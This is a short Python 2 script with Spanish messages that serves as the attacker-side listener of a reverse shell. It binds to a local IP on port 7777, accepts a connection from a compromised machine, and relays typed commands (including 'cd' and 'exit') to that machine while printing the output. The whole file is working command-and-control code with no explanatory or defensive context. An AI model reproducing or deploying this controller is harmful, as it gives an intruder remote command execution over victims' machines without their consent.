#!/user/bin/env python
#_*_ codign: utf8 _*_

import socket

def shell():
    current_dir = target.recv(1024)
    while True:
        comando = raw_input("{}~#: ".format(current_dir))
        if comando == "exit":
            target.send(comando)
            break
        elif comando[:2] == "cd":
            target.send(comando)
            res = target.recv(1024)
            current_dir = res
            print(res)
        elif comando == "":
            pass
        else:
            target.send(comando)
            res = target.recv(30000)
            if res == "1":
                continue
            else:
                print(res)

def upserver():
    global server
    global ip
    global target

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('192.168.20.109',7777))
    server.listen(1)

    print("Corriendo el servidor")

    target, ip = server.accept()
    print("Conexion recibida de: " + str(ip[0]))

upserver()
shell()
server.close()